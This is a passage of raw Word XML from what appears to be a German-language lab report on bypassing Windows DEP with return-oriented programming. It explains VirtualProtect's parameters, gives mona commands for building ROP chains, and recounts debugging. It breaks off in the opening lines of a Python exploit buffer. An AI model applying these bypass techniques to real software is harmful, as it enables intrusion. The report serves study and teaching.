        <w:t xml:space="preserve">ention (DEP) zu umgehen. </w:t>
      </w:r>
      <w:r w:rsidR="007A6C5E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dabei handelt es sich um </w:t>
      </w:r>
      <w:r w:rsidR="009F09FC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eine Speicherschutzfunktion auf Systemebene, die in das Betriebssystem integriert is</w:t>
      </w:r>
      <w:r w:rsidR="00046B42" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="002F0395" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00E52DD1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">DEP verhindert, dass Code von Datenseiten wie dem </w:t>
      </w:r>
      <w:r w:rsidR="002F0395" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Heap und</w:t>
      </w:r>
      <w:r w:rsidR="00E52DD1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Stacks ausgeführt wird. Wenn eine Anwendung versucht, Code von einer geschützten Datenseite auszuführen, tritt eine </w:t>
      </w:r>
      <w:r w:rsidR="00241518" w:rsidRPr="00241518">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">exception </w:t>
      </w:r>
      <w:r w:rsidR="00E52DD1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>für Speicherzugriffsverletzungen auf. Wenn die Ausnahme nicht behandelt wird, wird der aufrufende Prozess beendet</w:t>
      </w:r>
      <w:r w:rsidR="002F0395" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#32469151-1245-4bd4-99db-f93e34850554"/>
          <w:id w:val="-168092675"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="002F0395" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="002F0395" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[9]</w:t>
          </w:r>
          <w:r w:rsidR="002F0395" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00105DEB">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00263D7F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sollte ein Angreifer also </w:t>
      </w:r>
      <w:r w:rsidR="00C51AED" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Beispielsweise versuchen ein</w:t>
      </w:r>
      <w:r w:rsidR="000B3F55" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00C51AED" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Adresse ins EIP Register zu schreiben, we</w:t>
      </w:r>
      <w:r w:rsidR="00672EBA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">lche ein „jmp esp“ aufweist und anschließend versucht den Shellcode ausführen </w:t>
      </w:r>
      <w:r w:rsidR="00D84F53" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wird die Anwendung unterbrochen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673C2D61" w14:textId="0AA5DA34" w:rsidR="00D84F53" w:rsidRPr="00B47CB9" w:rsidRDefault="00D84F53" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17B0A8F4" w14:textId="2D1F1617" w:rsidR="00D84F53" w:rsidRPr="00B47CB9" w:rsidRDefault="00D84F53" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um dieses Verhalten umgehen zu können wird </w:t>
      </w:r>
      <w:r w:rsidR="009C59C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Return Oriented Programming (ROP) genutzt. Dabei wird eine Liste an Adressen </w:t>
      </w:r>
      <w:r w:rsidR="00A42B13" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">zu Gadgets erstellt, welche auf den Stack gelegt werden. Bei einem Gadget handelt es sich um eine Reihe von Instruktionen, gefolgt von einem Return. </w:t>
      </w:r>
      <w:r w:rsidR="00EC2430" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Dadurch wird die nächste Adresse am Stack in das EIP Register geladen und ausgeführt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9F44BA" w14:textId="251C5B47" w:rsidR="00B84E4A" w:rsidRPr="00B47CB9" w:rsidRDefault="00B84E4A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BE6861D" w14:textId="3C402718" w:rsidR="00B84E4A" w:rsidRPr="00B47CB9" w:rsidRDefault="00B84E4A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Eine Funktion, mit welcher DEP umgangen werden kann ist VirtualProtect. </w:t>
      </w:r>
      <w:r w:rsidR="00B20757" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Diese verändert für einen gewissen Speicherbereich die Zugriffsbeschränkungen.</w:t>
      </w:r>
      <w:r w:rsidR="005459B6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die Funktion hat 4 Übergabeparameter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04289D43" w14:textId="2525C924" w:rsidR="005459B6" w:rsidRPr="00B47CB9" w:rsidRDefault="005459B6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35A22D97" w14:textId="3393F920" w:rsidR="005459B6" w:rsidRPr="00B47CB9" w:rsidRDefault="005459B6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>lpAddress: Start</w:t>
      </w:r>
      <w:r w:rsidR="003166CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>adresse des Speicher</w:t>
      </w:r>
      <w:r w:rsidR="008B1B05" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="003166CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, dessen Schutzattribute verändert werden sollen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614E49CB" w14:textId="3E97DA00" w:rsidR="003166CB" w:rsidRPr="00B47CB9" w:rsidRDefault="008B1B05" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dwSize: Anzahl der Bytes, die überschrieben werden sollen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6293138E" w14:textId="7446E0C5" w:rsidR="008B1B05" w:rsidRPr="00B47CB9" w:rsidRDefault="008B1B05" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>flNewProtect: Speicherschutz Typ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E29E8EA" w14:textId="584871DC" w:rsidR="008B1B05" w:rsidRPr="00B47CB9" w:rsidRDefault="00246C19" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>lpflOldProtect: Pointer auf Variable, welche den vorherigen Schutztyp enthält</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E44F47D" w14:textId="66644B01" w:rsidR="00246C19" w:rsidRPr="00B47CB9" w:rsidRDefault="00246C19" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BFFA427" w14:textId="3DCF816F" w:rsidR="00D05E83" w:rsidRPr="00B47CB9" w:rsidRDefault="009E3144" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Zum Generieren</w:t>
      </w:r>
      <w:r w:rsidR="00EF3E5D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> der ROP Chain wurde mona verwendet. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Dies erfolgt mit</w:t>
      </w:r>
      <w:r w:rsidR="00EF3E5D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> dem Befehl „mona</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> rop“.</w:t>
      </w:r>
      <w:r w:rsidR="007A2F0F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Innerhalb der Testversuche wurden unterschiedliche ROP Chains mit Mona gebaut</w:t>
      </w:r>
      <w:r w:rsidR="00F7361A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Beispielsweise wurde versucht die ROP Chain </w:t>
      </w:r>
      <w:r w:rsidR="005C62D9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mit dem Befehl „mona rop </w:t>
      </w:r>
      <w:r w:rsidR="005D36D3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>-c</w:t>
      </w:r>
      <w:r w:rsidR="007F522E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">pb </w:t>
      </w:r>
      <w:r w:rsidR="003B73D6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">‚\x00‘ -m </w:t>
      </w:r>
      <w:r w:rsidR="00F70399" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">UCRTBASE, Kernel32, Ntdll, WS_32“. Die ROPChain wurde stehts </w:t>
      </w:r>
      <w:r w:rsidR="00302920" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">generiert und im Logordner unter </w:t>
      </w:r>
      <w:r w:rsidR="004F4EA7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">rop_chains.txt abgespeichert. Dort befindet sich eine vordefinierte Python ROP Chain, welche über eine Methode aufgerufen werden kann. </w:t>
      </w:r>
      <w:r w:rsidR="007C22E3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Sobald ich die ROP Chain jedoch getestet habe (mithilfe eines Breakpoints) </w:t>
      </w:r>
      <w:r w:rsidR="00C030A9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">bekam ich immer </w:t>
      </w:r>
      <w:r w:rsidR="00D64CB4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eine Access Violationen nach 2 – 3 Befehlen. Ich versuchte dann mit unterschiedlichen Tools (ROPGadget, Ropper) </w:t>
      </w:r>
      <w:r w:rsidR="00005DD7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die ROP Chain zu generieren, </w:t>
      </w:r>
      <w:r w:rsidR="00D85A30" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">sprang jedoch nie in den </w:t>
      </w:r>
      <w:r w:rsidR="00710288">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00D85A30" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>chreibbaren Bereich nach der Chain. Ich habe das Internet durchforstet und habe keine Meldungen zu diesem Thema gefunden</w:t>
      </w:r>
      <w:r w:rsidR="00FA4E4F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>. Also hab</w:t>
      </w:r>
      <w:r w:rsidR="00710288">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00FA4E4F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ich mona und python2.7 auf die </w:t>
      </w:r>
      <w:r w:rsidR="00710288" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>aktuelle</w:t>
      </w:r>
      <w:r w:rsidR="00FA4E4F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Version geupdatet, was schlussendlich jedoch auch keinen </w:t>
      </w:r>
      <w:r w:rsidR="00C10869" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nutzen diente. </w:t>
      </w:r>
      <w:r w:rsidR="00B75139" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Irgendwann probierte ich </w:t>
      </w:r>
      <w:r w:rsidR="00F03DD3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">das Kommando „!mona rop -m *.dll -cp nonull“ ohne aktiviertem ASLR auf einer </w:t>
      </w:r>
      <w:r w:rsidR="007A5DB0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>separaten</w:t>
      </w:r>
      <w:r w:rsidR="00F03DD3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Maschine und Sprang in den </w:t>
      </w:r>
      <w:r w:rsidR="00CA022C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">gewollten Bereich, welchen ich mit A’s aufgefüllt habe. Für </w:t>
      </w:r>
      <w:r w:rsidR="000F4A86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Umgehung </w:t>
      </w:r>
      <w:r w:rsidR="00CA022C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ASLR nutzte mir das jedoch nichts, da </w:t>
      </w:r>
      <w:r w:rsidR="0058434F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Module verwendet wurden,</w:t>
      </w:r>
      <w:r w:rsidR="000F4A86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C2E21" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">bei welchen ich die Base Adresse durch Address Leak nicht </w:t>
      </w:r>
      <w:r w:rsidR="007A5DB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>herausgefunden werden</w:t>
      </w:r>
      <w:r w:rsidR="003C2E21" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> konnte. Irgendwann </w:t>
      </w:r>
      <w:r w:rsidR="00E37E82" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">kam ich dann </w:t>
      </w:r>
      <w:r w:rsidR="00D05E83" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>durch tagelanges Probieren</w:t>
      </w:r>
      <w:r w:rsidR="00E37E82" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> darauf, dass Mona </w:t>
      </w:r>
      <w:r w:rsidR="00D05E83" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">sensitiv auf Abstände </w:t>
      </w:r>
      <w:r w:rsidR="0058434F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in den übergebenen Modulen</w:t>
      </w:r>
      <w:r w:rsidR="00D05E83" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> regiert. Aus meinem Befehl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F7F0D1" w14:textId="1FDE2CB6" w:rsidR="00D05E83" w:rsidRPr="00B47CB9" w:rsidRDefault="00D05E83" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29661118" w14:textId="43309DB2" w:rsidR="00D05E83" w:rsidRPr="00B47CB9" w:rsidRDefault="00D05E83" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>„mona rop -cpb ‚\x00‘ -m UCRTBASE, Kernel32, Ntdll, WS_32“</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1E847D" w14:textId="1CCD8C8C" w:rsidR="00D05E83" w:rsidRPr="00B47CB9" w:rsidRDefault="00D05E83" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1495A83C" w14:textId="4FEEDDB9" w:rsidR="00D05E83" w:rsidRPr="00B47CB9" w:rsidRDefault="00D05E83" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wurde also </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BCE3EB" w14:textId="7E805C73" w:rsidR="00F24E58" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24E58" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D679CD1" w14:textId="0A4DBC36" w:rsidR="00F24E58" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24E58" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>„mona rop -cpb ‚\x00‘ -m UCRTBASE,Kernel32,Ntdll,WS_32“</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389D1420" w14:textId="633A2999" w:rsidR="00B125FB" w:rsidRPr="00B47CB9" w:rsidRDefault="00B125FB" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="495AC572" w14:textId="0A7B5386" w:rsidR="00F24E58" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24E58" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>und siehe da, die ROPChain funktionierte!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383FE9D6" w14:textId="06FA8C64" w:rsidR="00F24E58" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24E58" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00857982" w:rsidRPr="00866A18" w14:paraId="77FFD75B" w14:textId="77777777" w:rsidTr="00857982">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2D8A4ECB" w14:textId="1941A512" w:rsidR="00FF2B89" w:rsidRPr="004D58C1" w:rsidRDefault="00FF2B89" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>rop_chain = create_rop_chain()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DC30DE4" w14:textId="4D14AEFF" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    a = b'\x41' * 36</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EF8B953" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    b = b'\x42' * 4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46EA624B" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    c = rop_chain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28C9B97B" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    d = b'\x41' * 9</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DDD5C2E" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="00B47CB9" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>e = b'\x42' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="102628E8" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="00B47CB9" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    f = b'\x43' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22FBF7BE" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
